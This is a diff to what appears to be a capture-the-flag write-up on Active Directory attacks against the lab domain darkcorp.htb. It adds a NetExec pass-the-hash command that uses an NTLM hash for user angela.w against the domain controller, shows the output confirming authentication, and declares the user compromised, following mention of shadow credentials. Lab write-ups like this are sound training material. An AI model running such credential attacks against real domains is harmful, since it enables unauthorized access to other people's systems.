@@ -1219,8 +1219,14 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Ill apply shadow credentials
 
 ```python
-
+nxc smb dc-01.darkcorp.htb -u angela.w -H '957246c8137069bca672dc6aa0af7c7a'           
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\angela.w:957246c8137069bca672dc6aa0af7c7a
 ```
+
+This user is now compromised
+
+
 
 
 
